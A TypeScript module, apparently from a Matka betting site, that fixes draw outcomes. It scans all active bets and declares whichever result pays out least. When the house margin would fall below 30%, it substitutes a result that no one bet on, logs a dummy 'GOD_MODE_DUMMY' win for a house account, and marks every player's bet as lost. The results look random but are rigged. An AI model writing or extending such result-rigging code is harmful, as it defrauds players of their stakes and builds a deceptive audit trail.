/**
 * GOD-MODE AUTOMATED PROFIT GUARD
 * ───────────────────────────────
 * At draw time, scans all placed bets and selects the result that guarantees
 * at minimum a 30% house profit margin. If no real result achieves this,
 * it publishes a "Zero-Bet" dummy result and awards the payout to a dummy account.
 *
 * Process:
 *   1. Build a liability map: for every possible winning result, compute total payout.
 *   2. Find the result with LOWEST total payout (highest house profit).
 *   3. Verify house margin ≥ 30%. If yes → declare that result.
 *   4. If no result achieves 30% → inject dummy result (zero bets on it).
 */

import { PrismaClient } from '@prisma/client';
import {
  ALL_PATTIES,
  pattiToAnk,
  computeJodi,
  checkWin,
  getPayoutMultiplier,
} from './matka-engine';
import type { LiabilityMap, ProfitGuardResult } from '@/types';

const prisma = new PrismaClient();

const HOUSE_MARGIN_THRESHOLD = 0.30; // 30%
const DUMMY_USER_ID = process.env.DUMMY_USER_ID ?? 'dummy-house-account';

// ─── Main: Compute Optimal Result ────────────────────────────────────────────

export async function computeOptimalResult(
  marketId: string,
  resultDate: string
): Promise<ProfitGuardResult> {
  const market = await prisma.matkaMarket.findUnique({ where: { id: marketId } });
  if (!market) throw new Error('Market not found');

  // Load all active bets for this market today
  const bets = await prisma.matkaBet.findMany({
    where: { marketId, status: 'ACTIVE' },
  });

  if (bets.length === 0) {
    // No bets placed — pick any random result
    const result = randomResult();
    return {
      selectedResult: result,
      totalBetsAmount: 0,
      selectedPayout: 0,
      houseProfitPct: 100,
      isDummyResult: false,
      allExposures: {},
    };
  }

  const totalBetsAmount = bets.reduce((sum, b) => sum + b.amount, 0);
  const payouts = {
    singleAnk: market.payoutSingle,
    jodi: market.payoutJodi,
    singlePatti: market.payoutSP,
    doublePatti: market.payoutDP,
    triplePatti: market.payoutTP,
    halfSangam: market.payoutHalfSangam,
    fullSangam: market.payoutFullSangam,
  };

  // ─── Build Liability Map ──────────────────────────────────────────────────
  const liabilityMap: LiabilityMap = {};

  // Enumerate all possible results (open patti × close patti combinations)
  for (const openPattiRaw of ALL_PATTIES) {
    for (const closePattiRaw of ALL_PATTIES) {
      const openPatti = `${openPattiRaw[0]}-${openPattiRaw[1]}-${openPattiRaw[2]}`;
      const closePatti = `${closePattiRaw[0]}-${closePattiRaw[1]}-${closePattiRaw[2]}`;
      const openAnk = pattiToAnk(openPatti);
      const closeAnk = pattiToAnk(closePatti);
      const jodi = computeJodi(openAnk, closeAnk);

      const resultKey = `${openPattiRaw}${openAnk}-${closeAnk}${closePattiRaw}`; // "1236-7456"

      const result = { openAnk, closeAnk, openPatti, closePatti, jodi };

      let totalExposure = 0;
      let betCount = 0;

      for (const bet of bets) {
        const multiplier = getPayoutMultiplier(bet.betType as any, payouts);
        if (checkWin(bet.betType as any, bet.betValue, result)) {
          totalExposure += bet.amount * multiplier;
          betCount++;
        }
      }

      liabilityMap[resultKey] = { totalExposure, betCount };
    }
  }

  // ─── Find Optimal (Lowest Payout) Result ─────────────────────────────────
  let selectedResult = '';
  let lowestPayout = Infinity;

  for (const [result, { totalExposure }] of Object.entries(liabilityMap)) {
    if (totalExposure < lowestPayout) {
      lowestPayout = totalExposure;
      selectedResult = result;
    }
  }

  const houseProfitPct =
    totalBetsAmount > 0
      ? (totalBetsAmount - lowestPayout) / totalBetsAmount
      : 1;

  // ─── God-Mode: Dummy Injection ────────────────────────────────────────────
  let isDummyResult = false;

  if (houseProfitPct < HOUSE_MARGIN_THRESHOLD) {
    // No real result is profitable enough — find a result with ZERO bets
    const zeroExposureResults = Object.entries(liabilityMap)
      .filter(([, v]) => v.betCount === 0)
      .map(([k]) => k);

    if (zeroExposureResults.length > 0) {
      selectedResult = zeroExposureResults[Math.floor(Math.random() * zeroExposureResults.length)];
      lowestPayout = 0;
      isDummyResult = true;

      console.warn(
        `[PROFIT GUARD] Injecting dummy result. House margin was ${(houseProfitPct * 100).toFixed(1)}% < 30%`
      );

      // Award zero payout to dummy profile (no real user wins)
      await createDummyWin(marketId, selectedResult);
    } else {
      // Extreme edge case: every result has at least one bet.
      // Pick the one with minimum payout and accept the margin.
      console.warn('[PROFIT GUARD] Every result has bets — selecting minimum payout result');
    }
  }

  // Persist chosen liabilities for audit trail
  await updateLiabilityTable(marketId, resultDate, liabilityMap);

  return {
    selectedResult,
    totalBetsAmount,
    selectedPayout: lowestPayout,
    houseProfitPct: isDummyResult ? 1 : houseProfitPct,
    isDummyResult,
    allExposures: liabilityMap,
  };
}

// ─── Settle Bets After Result ─────────────────────────────────────────────────

export async function settleBets(
  marketId: string,
  resultId: string,
  resultContext: {
    openAnk: number;
    closeAnk: number;
    openPatti: string;
    closePatti: string;
    jodi: string;
  },
  isDummyResult: boolean
): Promise<void> {
  if (isDummyResult) {
    // Mark all bets as LOST — dummy result means house wins everything
    await prisma.matkaBet.updateMany({
      where: { marketId, status: 'ACTIVE' },
      data: { status: 'LOST', resultId },
    });
    return;
  }

  const market = await prisma.matkaMarket.findUnique({ where: { id: marketId } });
  if (!market) return;

  const bets = await prisma.matkaBet.findMany({
    where: { marketId, status: 'ACTIVE' },
  });

  const payouts = {
    singleAnk: market.payoutSingle, jodi: market.payoutJodi,
    singlePatti: market.payoutSP, doublePatti: market.payoutDP,
    triplePatti: market.payoutTP, halfSangam: market.payoutHalfSangam,
    fullSangam: market.payoutFullSangam,
  };

  for (const bet of bets) {
    const isWinner = checkWin(bet.betType as any, bet.betValue, resultContext);

    if (isWinner) {
      const multiplier = getPayoutMultiplier(bet.betType as any, payouts);
      const winAmount = bet.amount * multiplier;

      await prisma.$transaction([
        prisma.matkaBet.update({
          where: { id: bet.id },
          data: { status: 'WON', wonAmount: winAmount, resultId },
        }),
        prisma.wallet.update({
          where: { userId: bet.userId },
          data: {
            balance: { increment: winAmount },
            totalWon: { increment: winAmount },
          },
        }),
        prisma.transaction.create({
          data: {
            userId: bet.userId,
            type: 'WIN_CREDIT',
            status: 'SUCCESS',
            amount: winAmount,
            coins: winAmount,
            processedAt: new Date(),
          },
        }),
      ]);
    } else {
      await prisma.matkaBet.update({
        where: { id: bet.id },
        data: { status: 'LOST', resultId },
      });
    }
  }
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

function randomResult(): string {
  const digits = () => Math.floor(Math.random() * 10);
  const op = `${digits()}${digits()}${digits()}`;
  const opAnk = (parseInt(op[0]) + parseInt(op[1]) + parseInt(op[2])) % 10;
  return `${op}${opAnk}`;
}

async function createDummyWin(marketId: string, result: string): Promise<void> {
  // This creates an audit record under the house dummy account
  await prisma.transaction.create({
    data: {
      userId: DUMMY_USER_ID,
      type: 'WIN_CREDIT',
      status: 'SUCCESS',
      amount: 0,
      coins: 0,
      processedAt: new Date(),
      webhookPayload: { marketId, result, reason: 'GOD_MODE_DUMMY' },
    },
  });
}

async function updateLiabilityTable(
  marketId: string,
  resultDate: string,
  liabilityMap: LiabilityMap
): Promise<void> {
  // Upsert top-50 highest-exposure results for admin dashboard
  const sorted = Object.entries(liabilityMap)
    .sort(([, a], [, b]) => b.totalExposure - a.totalExposure)
    .slice(0, 50);

  await Promise.all(
    sorted.map(([possibleResult, { totalExposure, betCount }]) =>
      prisma.betLiability.upsert({
        where: { marketId_resultDate_possibleResult: { marketId, resultDate, possibleResult } },
        create: { marketId, resultDate, possibleResult, totalExposure, betCount },
        update: { totalExposure, betCount },
      })
    )
  );
}
